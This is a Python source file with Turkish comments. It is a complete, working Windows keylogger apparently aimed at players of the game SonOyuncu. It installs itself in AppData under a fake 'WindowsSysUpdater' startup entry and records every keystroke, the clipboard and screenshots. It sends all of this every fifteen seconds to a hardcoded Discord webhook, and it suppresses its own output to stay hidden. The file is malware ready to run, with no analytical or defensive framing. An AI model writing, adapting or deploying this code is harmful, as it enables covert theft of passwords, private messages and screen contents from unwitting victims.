import keyboard
import requests
import os
import sys
import threading
import shutil
import time
import pyperclip
from PIL import ImageGrab
import winreg as reg

# --- AYARLAR ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1462939087643218104/aAOguMZNLqFB75mB_BQuT9uzvGLSZcabosU_eQgIV-bpcf19KcAalLZ23OvbXBJBtQdP"
RAPOR_ARALIGI = 15 

class SonOyuncuMasterLog:
    def __init__(self, interval, webhook):
        self.interval = interval
        self.webhook = webhook
        self.full_log = ""    # [SHIFT], [CTRL] her şey dahil
        self.clean_log = ""   # Sadece düzgün metin (Backspace uygulanmış hali)
        self.raw_log = ""     # Sadece basılan harfler (Filtresiz)
        self.last_clipboard = ""
        self.lock = threading.Lock()
        self.appdata = os.environ["APPDATA"]
        self.so_path = os.path.join(self.appdata, ".sonoyuncu")
        self.gizli_dosya = os.path.join(self.so_path, "WinUpdate.pyw")

    def sisteme_yerles(self):
        try:
            if not os.path.exists(self.so_path): os.makedirs(self.so_path)
            if not os.path.exists(self.gizli_dosya): shutil.copy(sys.argv[0], self.gizli_dosya)
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(key, "WindowsSysUpdater", 0, reg.REG_SZ, f'pythonw.exe "{self.gizli_dosya}"')
            reg.CloseKey(key)
        except: pass

    def pano_takip(self):
        while True:
            try:
                current_clipboard = pyperclip.paste()
                if current_clipboard != self.last_clipboard:
                    with self.lock:
                        info = f"\n[PANO: {current_clipboard}]\n"
                        self.full_log += info
                        self.clean_log += info
                    self.last_clipboard = current_clipboard
            except: pass
            time.sleep(2)

    def veri_gonder(self):
        while True:
            time.sleep(self.interval)
            try:
                with self.lock:
                    f_log, c_log, r_log = self.full_log, self.clean_log, self.raw_log
                    self.full_log, self.clean_log, self.raw_log = "", "", ""

                if f_log or c_log or r_log:
                    embed_data = {
                        "username": "SonOyuncu Sistem Analizi",
                        "embeds": [
                            {
                                "title": "⌨️ 1. FULL LOG (Tüm Tuşlar)",
                                "description": f"```{f_log if f_log else 'Veri yok'}```",
                                "color": 15158332
                            },
                            {
                                "title": "📝 2. TEMİZ LOG (Sadece Metin)",
                                "description": f"```{c_log if c_log else 'Veri yok'}```",
                                "color": 3066993
                            },
                            {
                                "title": "🔡 3. HAM KAYIT (Sadece Harfler)",
                                "description": f"```{r_log if r_log else 'Veri yok'}```",
                                "color": 3447003
                            }
                        ]
                    }
                    requests.post(self.webhook, json=embed_data)

                # Ekran Görüntüsü
                ss_yolu = os.path.join(os.environ["TEMP"], "v_tmp.png")
                ImageGrab.grab().save(ss_yolu)
                with open(ss_yolu, 'rb') as f: requests.post(self.webhook, files={'file': f})
                os.remove(ss_yolu)
            except: pass

    def tus_yakala(self, event):
        if event.event_type == "down":
            with self.lock:
                name = event.name
                
                # 1. FULL LOG KAYDI (Her şey)
                if len(name) > 1:
                    self.full_log += f"[{name.upper()}]"
                else:
                    self.full_log += name

                # 2. TEMİZ LOG KAYDI (Okunabilir metin)
                if len(name) == 1:
                    self.clean_log += name
                elif name == "space":
                    self.clean_log += " "
                elif name == "enter":
                    self.clean_log += "\n"
                elif name == "backspace":
                    self.clean_log = self.clean_log[:-1]

                # 3. HAM KAYIT (Sadece harf ve rakamlar)
                if len(name) == 1:
                    self.raw_log += name

    def baslat(self):
        self.sisteme_yerles()
        threading.Thread(target=self.veri_gonder, daemon=True).start()
        threading.Thread(target=self.pano_takip, daemon=True).start()
        keyboard.hook(self.tus_yakala)
        keyboard.wait()

if __name__ == "__main__":
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    bot = SonOyuncuMasterLog(interval=RAPOR_ARALIGI, webhook=WEBHOOK_URL)
    bot.baslat()
